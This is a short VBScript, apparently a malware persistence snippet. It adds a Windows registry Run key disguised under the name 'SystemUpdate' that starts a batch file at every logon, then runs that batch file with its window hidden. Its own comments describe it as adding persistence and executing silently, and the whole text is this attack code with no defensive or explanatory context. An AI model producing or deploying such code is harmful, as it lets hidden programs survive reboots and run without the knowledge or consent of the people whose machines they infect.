Set objShell = CreateObject("WScript.Shell")

' Add persistence by modifying the registry
objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", "C:\Path\To\cycle.bat"

' Silently execute the batch file
objShell.Run "C:\Path\To\cycle.bat", 0, False
